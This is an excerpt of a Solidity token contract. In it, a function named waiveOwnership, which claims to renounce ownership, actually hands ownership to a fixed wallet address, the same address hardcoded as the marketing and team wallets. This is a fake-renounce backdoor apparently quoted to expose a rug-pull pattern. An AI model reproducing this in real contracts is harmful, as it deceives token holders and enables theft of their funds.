...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x13AE02aa7aF34B46d1Ca0A3f4E44BaEAE46A1607));
        _owner = address(0x13AE02aa7aF34B46d1Ca0A3f4E44BaEAE46A1607);
    }
...
contract  x  is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x13AE02aa7aF34B46d1Ca0A3f4E44BaEAE46A1607);
    address payable public teamWalletAddress = payable(0x13AE02aa7aF34B46d1Ca0A3f4E44BaEAE46A1607);
